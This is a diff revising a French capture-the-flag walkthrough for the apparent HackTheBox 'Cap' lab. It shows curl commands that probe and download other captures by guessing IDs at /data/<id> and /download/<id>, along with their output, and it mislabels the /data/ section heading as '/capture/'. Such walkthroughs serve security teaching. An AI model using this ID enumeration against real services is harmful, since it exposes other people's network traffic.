@@ -487,6 +487,8 @@ Les différents menus permettent d’identifier rapidement leur rôle :
 - **Network Status** présente également des données sans interaction possible
 - **Security Snapshot (5 Second PCAP + Analysis)** déclenche une capture réseau côté serveur
 
+![security capture](security-dashboard.png)
+
 Les deux premiers menus sont **purement informatifs** : aucune interaction ni paramètre exploitable.
 
 Le troisième menu introduit en revanche une **fonctionnalité active côté serveur**.
@@ -497,11 +499,9 @@ Lorsque tu déclenches un snapshot, l’application redirige vers une URL de la 
 http://cap.htb/data/<id>
 ```
 
-Cette page affiche les résultats de l’analyse et propose un bouton **Download** permettant de récupérer un fichier :
+![download button](download-button.png)
 
-```
-<id>.pcap
-```
+En analysant le code source de la page, tu vois que le bouton **Download** pointe vers `/download/<id>`, ce qui te permet d’identifier l’endpoint de téléchargement des fichiers PCAP.
 
 Tu identifies ici un mécanisme simple :
 
@@ -511,9 +511,9 @@ Tu identifies ici un mécanisme simple :
 
 ### Analyse des endpoints identifiés
 
-Ces observations orientent l’analyse vers **`/capture/`** et surtout **`/data/`**, utilisé pour exposer les captures.
+> Ces observations te montrent que les répertoires `/capture/` et `/data/` sont directement impliqués dans la gestion des captures, ce qui oriente naturellement ton analyse vers ces deux endpoints.
 
-#### Analyse de /capture/
+**Analyse de /capture/**
 
 ```bash
 mon-recoweb cap.htb/capture/ 
@@ -523,7 +523,7 @@ Les résultats montrent que **`/capture/`** n’expose aucune ressource exploita
 
 Tu peux écarter cette piste.
 
-#### Analyse de /data/
+**Analyse de /capture/**
 
 ```bash
 mon-recoweb cap.htb/data/ 
@@ -579,56 +579,84 @@ La présence de **`/data/0`** indique qu’une capture existait déjà avant tes
 Tu peux maintenant récupérer ces fichiers et analyser leur contenu.
 
 
-### Téléchargement en batch des PCAP
+### Téléchargement des PCAP
 
 Plutôt que de passer par l’interface web, tu récupères directement les fichiers **PCAP** en ligne de commande.
 
+**Vérifier l’existence d’un fichier**
+
+Pour savoir si une capture existe, tu peux interroger directement l’URL correspondante :
+
 ```bash
+curl -I http://cap.htb/data/<id>
+```
+
+- `200 OK` → la capture existe
+- `404 Not Found` → la capture n’existe pas
+
+**Télécharger le fichier PCAP**
+
+Si la ressource existe, tu peux la récupérer via la route de téléchargement :
+
+```
 mkdir -p pcaps
 
-for i in $(seq 0 50); do
-  data_url="http://cap.htb/data/$i"
-  dl_url="http://cap.htb/download/$i"
-  out="pcaps/${i}.pcap"
-
-  # Tester l'existence logique de /data/<id>
-  if curl -s -o /dev/null -w "%{http_code}" "$data_url" | grep -q "^200$"; then
-    # Télécharger uniquement si /data/<id> existe
-    if curl -sL -f -o "$out" "$dl_url"; then
-      echo "[+] /data/$i -> downloaded $out"
-    else
-      rm -f "$out"
-    fi
-  fi
-done
+curl http://cap.htb/download/<id> -o pcaps/<id>.pcap
 ```
 
-Ce script :
 
-- vérifie l’existence des ressources `/data/<id>`
-- télécharge uniquement les captures valides
-- évite de conserver des fichiers vides ou invalides
 
-voici ce que tu obtiens :
+**Récupération de `0.pcap`**
 
 ```bash
-[+] /data/0 -> downloaded pcaps/0.pcap
-[+] /data/1 -> downloaded pcaps/1.pcap
-[+] /data/2 -> downloaded pcaps/2.pcap
-[+] /data/3 -> downloaded pcaps/3.pcap
-
-ls -l pcaps/    
-total 24
--rw-r--r-- 1 kali kali 9935 [date] 16:48 0.pcap
--rw-r--r-- 1 kali kali   24 [date] 16:48 1.pcap
--rw-r--r-- 1 kali kali   24 [date] 16:48 2.pcap
--rw-r--r-- 1 kali kali   24 [date] 16:48 3.pcap
-
+curl -I http://cap.htb/data/0
 ```
 
-> Note : Le nombre de fichiers dépend des captures générées via l’interface web.
+
+
+```
+HTTP/1.1 200 OK
+Server: gunicorn
+Date: [date] 08:19:52 GMT
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Content-Length: 17147
+```
+
+La réponse **`200 OK`** confirme que la capture existe.
+
+Tu peux alors la télécharger :
+
+```bash
+curl http://cap.htb/download/0 -o pcaps/0.pcap
+```
+
+
+
+```
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100   9935 100   9935   0      0 139.1k      0
+```
+
+
+
+**Récupération d'autres captures**
+
+Télécharge ensuite d’autres captures (`1.pcap`, `2.pcap`, …) afin de les comparer avec `0.pcap` et identifier d’éventuelles différences intéressantes.
+
+> Note : Le nombre de fichiers dépend des captures que tu as générées via l’interface web.
 
 ### Analyse des fichiers récupérés
+
+```
+ls -l pcaps/  
+
+total 20
+-rwxrwxrwx 1 kali kali 9935 [date] 10:52 0.pcap
+-rwxrwxrwx 1 kali kali   24 [date] 11:01 1.pcap
+-rwxrwxrwx 1 kali kali   24 [date] 11:01 2.pcap
+```
 
 Tu observes immédiatement une différence :
 
